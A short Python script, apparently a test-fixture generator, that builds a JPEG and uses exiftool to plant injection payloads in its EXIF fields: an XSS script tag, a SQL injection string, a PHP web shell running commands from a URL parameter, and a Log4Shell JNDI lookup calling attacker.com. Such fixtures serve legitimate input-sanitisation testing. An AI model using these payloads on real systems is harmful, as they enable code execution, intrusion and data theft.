#!/usr/bin/env python3
from PIL import Image
import subprocess
import os

# Create test image
img = Image.new('RGB', (800, 800), color='red')
test_image = "test_image.jpg"
img.save(test_image)

# Inject multiple payloads using exiftool
payloads = {
    'Comment': '<script>alert("XSS")</script>',
    'Artist': "' OR 1=1 -- -",
    'Copyright': '<?php system($_GET["cmd"]); ?>',
    'GPSLatitude': '37 46 26.00',
    'GPSLongitude': '122 25 52.00',
    'Software': 'SecretApp v1.3.7',
    'Make': 'TestDevice\n${jndi:ldap://attacker.com}'
}

for field, value in payloads.items():
    subprocess.run([
        'exiftool',
        f'-{field}={value}',
        '-overwrite_original',
        test_image
    ], capture_output=True)

print(f"Test image created: {test_image}")
print("EXIF Data Preview:")
subprocess.run(['exiftool', test_image], check=True)

# Cleanup temporary files
[os.remove(f) for f in os.listdir() if f.startswith('exiftool_tmp')]
